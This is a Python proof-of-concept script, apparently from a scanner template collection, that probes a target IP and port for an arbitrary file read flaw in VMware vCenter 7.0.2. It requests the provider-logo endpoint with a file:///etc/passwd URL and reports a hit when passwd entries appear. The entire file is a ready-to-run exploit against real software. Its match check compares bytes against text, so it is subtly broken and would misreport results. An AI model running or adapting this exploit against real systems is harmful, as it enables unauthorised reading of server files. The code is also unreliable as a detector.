#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd"                                                      #填写payload
    try:
        tar = "http://" + ip + ":" + port
        req = requests.get(tar + payload,timeout=3,verify=False,allow_redirects=False)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if ( b"root:x:" in req.text ) and ( b"bin:x:" in req.text ) :          #填写匹配信息
                logging.info(u"[+] {} find VMware_vCenter_v7.0.2_Arbitrary_File_Read".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info(u"[-] {} do not found VMware_vCenter_v7.0.2_Arbitrary_File_Read".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info(u"[-] {} do not found VMware_vCenter_v7.0.2_Arbitrary_File_Read".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] timeout")
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
